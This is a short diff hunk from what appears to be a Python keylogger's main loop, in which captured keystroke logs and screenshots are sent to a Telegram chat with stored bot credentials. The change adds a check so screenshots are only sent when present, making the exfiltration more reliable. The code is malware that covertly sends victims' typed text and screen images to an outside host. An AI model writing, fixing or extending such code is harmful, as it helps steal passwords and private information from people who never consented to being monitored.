@@ -76,7 +76,8 @@ def main():
             send_info_telegram(**creds,
                                message='PROCESSED KEYLOGGER LOG\n\n' +
                                processed_message)
-            send_image_telegram(**creds, image=screenshot)
+            if screenshot is not None:
+                send_image_telegram(**creds, image=screenshot)
 
     except KeyboardInterrupt:
         handle_keyboard_interrupt(key_listener)
